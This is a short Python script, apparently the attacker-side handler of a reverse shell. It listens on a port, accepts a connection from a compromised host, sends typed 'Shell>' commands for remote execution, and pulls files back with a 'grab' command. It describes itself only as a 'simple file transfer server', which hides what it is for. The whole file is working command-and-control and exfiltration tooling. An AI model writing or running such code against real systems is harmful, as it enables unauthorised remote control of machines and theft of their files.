import socket  # Needed for connection
import os  # Needed for file operation
import logging  # Needed for logging
import sys
import argparse  # Needed for argument parsing

# Configure logging
logging.basicConfig(
    level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s"
)

def transfer(conn, command):
    try:
        conn.send(command.encode())
        file_name = command.split("*")[1]
        with open(file_name, "wb") as file:
            while True:
                bits = conn.recv(1024)
                if b"Unable to find out the file" in bits:
                    print("File doesn't exist.")
                    logging.error("Unable to find out the file: %s", file_name)
                    break
                elif bits.endswith(b"DONE"):
                    print("Transfer completed.")
                    break
                else:
                    file.write(bits)
    except Exception as e:
        logging.error("Error during file transfer: %s", e)

def connect(server_ip, server_port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
        try:
            client.bind((server_ip, server_port))
            client.listen(1)
            logging.info("Listening for incoming connections on %s:%d", server_ip, server_port)
            print("Listening for incoming connections on %s:%d" % (server_ip, server_port))
            conn, addr = client.accept()
            with conn:
                print("Got connection from %s:%d" % (addr[0], addr[1]))
                logging.info("Got connection from %s:%d", addr[0], addr[1])
                while True:
                    try:
                        command = input("Shell> ")
                        if command.strip() == "":
                            continue
                        elif command.lower().strip() == "exit":
                            conn.send("exit".encode())
                            break
                        elif command.startswith("grab"):
                            transfer(conn, command)
                        else:
                            conn.send(command.encode())
                            print((conn.recv(1024)).decode())
                    except KeyboardInterrupt:
                        print("Exiting...")
                        sys.exit()
        except Exception as e:
            logging.error("Error during connection: %s", e)
            print("An error occurred, please check the logs.")

def main():
    parser = argparse.ArgumentParser(description="Simple file transfer server.")
    parser.add_argument('--ip', type=str, default='192.168.1.13',
                        help='Server IP address to listen on (default: 192.168.1.13)')
    parser.add_argument('--port', type=int, default=9999,
                        help='Server port to listen on (default: 9999)')
    
    args = parser.parse_args()

    server_ip = args.ip
    server_port = args.port
    connect(server_ip, server_port)

if __name__ == "__main__":
    main()
